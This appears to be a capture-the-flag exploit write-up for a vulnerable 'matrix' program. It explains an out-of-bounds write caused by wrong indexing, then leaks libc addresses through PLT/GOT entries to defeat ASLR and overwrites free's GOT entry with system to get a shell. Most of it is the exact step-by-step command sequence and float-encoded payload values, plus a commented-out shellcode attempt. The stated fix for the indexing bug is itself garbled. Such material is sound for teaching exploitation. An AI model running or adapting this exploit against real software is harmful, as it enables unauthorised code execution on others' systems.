The matrix program is an interactive program that allows you to create
and manipulate floating point matrices.  The bug is in its indexing.
Specifically, in handle_set, we have the following:
    m->data[r * m->nrows + c] = v;
This should be c * m->nrows + c.  Thus, the code only works if the
matrices are all square.  Otherwise you can corrupt the matrices and
eventually get arbitrary memory writes and eventually code execution.
The level disables execution on the stack and on the heap, making it
impossible for you to inject shellcode.  Moreover, the stack and heap
are both randomized, making it difficult for you to locate your attack.
In addition, many of the C library calls that populate the PLT do not
seem amenable to a return-oriented attack since we need a pointer that
points to something we can overwrite.  Things like printf and puts are
passed pointers to read-only, static strings.  The exception is the
call to free.  Since it is given a pointer that points to our matrix
data, if we can somehow get that pointer to point to the string "/bin/sh"
and then overwrite free's PLT entry with the address to where system is
in libc, we would then be able to get a shell.  This is the attack.
To pull off the attack, however, we need to be able to figure out where
system is dynamically loaded into memory at run-time.  Due to ASLR, we
have to leak its location.  This is done by observing that the PLT
entries are in fixed locations:

080484a0 <setbuf@plt>:
 80484a0:       ff 25 04 a1 04 08       jmp    *0x804a104
080484b0 <printf@plt>:
 80484b0:       ff 25 08 a1 04 08       jmp    *0x804a108
080484c0 <free@plt>:
 80484c0:       ff 25 0c a1 04 08       jmp    *0x804a10c

Thus, we can use the matrix vulnerability to find out these locations
and then use the fact that the offset of system from those two calls
and system remains constant to deduce where system is.  Specifically,
this instruction tells us system is below both printf and setbuf in
memory

$ readelf -s /lib32/libc.so.6 | egrep " printf@| setbuf@| system@"
   640: 0004cc70    52 FUNC    GLOBAL DEFAULT   12 printf@@GLIBC_2.0
  1443: 0003e3e0    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
  2243: 0006b350    35 FUNC    GLOBAL DEFAULT   12 setbuf@@GLIBC_2.0

So, the exploit....
#######################################################################
# Step 1: Create 2 matrices
#   create 8 6
#   create 1 1
#
# Step 2: Inject code to place the string /bin/sh into matrix #1
#   Note that the values are being sent as floats so you need to
#   take the characters that represent the string and see what they
#   are when interpreted as 32-bit floats (matrix_hex2float does this)
#   set 0 0 0 1.80571759924800823863e+28
#   set 0 0 1 9.59221168824863188322e-39
#
# Step 3: Matrices are stored in an array (with each matrix struct
#   having the rows, cols, and a pointer to the malloc'd data stored)
#   So, we can overflow matrix1 to set rows and cols in matrix2
#   set 0 6 2 100000
#   set 0 6 3 100000
#
# Step 4: We also want to overwrite the pointer so that it points off to
#   wherever we need it to.  Since the PLT is around 0x804a000, we then
#   overflow matrix1 to set the data pointer of matrix2 to 0x0804a000
#   (Again, we use the matrix_hex2float to determine the float)
#   set 0 6 4 3.99103841991183054706e-34
#
# Step 5: We now need to probe the matrices to find out where the C
#   library has been dynamically loaded into memory.  Since it is
#   randomized, the attack must do the probe and the exploit in the
#   same session. So, pick the printf@plt entry and see that it points
#   to 0x804a104.  To read this entry, we will need to go into the
#   second matrix (which starts now at 0x804a100) and index into it.
#   0x108/4 = 264/4 = 63.
#   get 1 0 63
#
# Step 6:  Then, given this floating point number, convert back to
#   hexadecimal to get address of setbuf in memory.  setbuf is
#   0x4CC70-0x3E3E0=0x1E6E0 above system.  So, take the address you
#   get and subtract 0x1E6E0
#
#
# Step 7: Since the PLT entry we want to write is at free@plt, which
#   points to 0x804a10c, we need to find an index that will offset
#   us from 0x804a000 to get us there.  Since the matrix is of floats,
#   the index that will get us there is 0x10c/4=268/4 = 67.
#

#######################################################################
#1 Overwrite free@plt's 0x804a10c with address of system 0xf7e5c3e0
create 8 6
create 1 1
set 0 0 0 1.80571759924800823863e+28
set 0 0 1 9.59221168824863188322e-39
set 0 6 2 100000
set 0 6 3 100000
set 0 6 4 3.99103841991183054706e-34
set 1 0 67 -9.32038123113742810842e+33
destroy 0
#######################################################################
#1 Annotated
# Place address of system (0x8048300) at address 0x0804a10c
# Uses offset from where data pointer was set to (i.e. 67*4+0x804a000=0x804a10c)
# Float represented by \xa0 \xfd \xe2 \xf7 is
#   set 1 0 67 -9.20783762628591561687e+33
# Float represented by \x08 \x04 \x83 \x00 is 3.987..e-34
#   set 1 0 67 3.98762948629444591328e-34
# Call hijacked free to get code exec
#   destroy 0

# Code to inject shellcode into matrix and attempt to overwrite stack
#  so that it returns to it.  Does not work since heap is non-executable
# Code to inject shellcode as floats (23 byte shellcode)
#set 0 0 0 3.94319013648458518731e+24
#set 0 0 1 4.59362175606283167387e+24
#set 0 0 2 1.70900690574365457876e+25
#set 0 0 3 3.05394769920000000000e+10
#set 0 0 4 -1.64099345223434056606e-09
#set 0 0 5 1.18284990659137490526e-38
# Set matrix2 data pointer to 0xff7f...
#  This is done so that number isn't NaN.
#set 0 6 4 -340042060931954398472191680398531493888.000000
# The address of matrix1 data is the address returned by first calloc
#   (0x804b420).  It contains the shellcode previously set
# Attempt to write 0x804b420 into address that %esp points to when
#   it returns from handle_set (0xffffdaec)
#set 1 0 2097741 3.99340410229286040067e-34
